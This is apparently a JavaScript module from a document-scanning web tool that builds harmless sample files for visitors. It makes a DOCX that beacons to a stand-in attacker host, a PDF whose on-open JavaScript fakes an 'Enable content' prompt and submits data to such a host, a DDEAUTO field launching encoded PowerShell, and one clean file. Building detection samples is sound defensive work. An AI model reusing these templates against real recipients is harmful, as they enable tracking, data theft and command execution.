// Built-in example files, generated in the browser so visitors can try the tool
// without hunting for a malware sample. Each is clearly synthetic and harmless.

import { buildZip } from './archive.js';

const te = (s) => new TextEncoder().encode(s);

const CONTENT_TYPES = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>';
const ROOT_RELS = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>';

async function beaconDocx() {
  const docRels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://tracker.example-attacker.test/beacon.png?doc=invoice&amp;id=7f3a9" TargetMode="External"/></Relationships>';
  const document = '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body><w:p><w:r><w:t>Invoice 2026-0458 - please review the attached figures.</w:t></w:r></w:p></w:body></w:document>';
  return buildZip({ '[Content_Types].xml': CONTENT_TYPES, '_rels/.rels': ROOT_RELS, 'word/document.xml': document, 'word/_rels/document.xml.rels': docRels });
}

async function cleanDocx() {
  const document = '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Team lunch is moved to Thursday at noon. Nothing else changed.</w:t></w:r></w:p></w:body></w:document>';
  return buildZip({ '[Content_Types].xml': CONTENT_TYPES, '_rels/.rels': ROOT_RELS, 'word/document.xml': document, 'word/media/image1.png': new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a]) });
}

function autoPdf() {
  return te('%PDF-1.7\n1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n2 0 obj<</S/JavaScript/JS(var host="https://collect.example-attacker.test/x";app.alert({cMsg:"Enable content to view",nIcon:3});this.submitForm({cURL:host,cSubmitAs:"HTML"});)>>endobj\n3 0 obj<</Type/Page>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF');
}

function ddeXml() {
  return te('<?xml version="1.0"?><?mso-application progid="Word.Document"?>\n<w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml">\n<w:body><w:p><w:fldSimple w:instr=\' DDEAUTO c:\\\\Windows\\\\System32\\\\cmd.exe "/c powershell -enc SQBFAFgA..." \'/></w:p></w:body></w:wordDocument>');
}

export const SAMPLES = [
  { id: 'beacon', name: 'invoice-tracker.docx', label: 'Phones home', note: 'Loads a remote image on open', danger: true, make: beaconDocx },
  { id: 'pdf', name: 'statement-autorun.pdf', label: 'Auto-runs code', note: 'Runs JavaScript on open', danger: true, make: autoPdf },
  { id: 'dde', name: 'notice.xml', label: 'Runs a command', note: 'Launches PowerShell via DDE', danger: true, make: ddeXml },
  { id: 'clean', name: 'lunch-note.docx', label: 'Ordinary file', note: 'No macros, no web requests', danger: false, make: cleanDocx },
];

export async function makeSample(id) {
  const s = SAMPLES.find((x) => x.id === id);
  if (!s) return null;
  const bytes = await s.make();
  return { name: s.name, bytes: bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes) };
}
